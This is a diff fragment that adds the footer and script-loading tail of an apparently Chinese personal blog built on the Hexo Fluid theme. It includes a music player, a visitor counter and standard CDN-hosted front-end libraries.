+           <!--音乐--> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script> <div id="player" class="aplayer aplayer-withlist aplayer-fixed" data-id="9723733050" data-server="netease" data-type="playlist" autoplay="true" data-order="list"  data-fixed="true" data-listfolded="true" data-theme="#2D8CF0"></div> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon<br /> 感谢 <a target="_blank" rel="noopener" href="https://www.dkdun.cn/">DK盾</a> 赞助|DK盾 QQ群:727077055 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
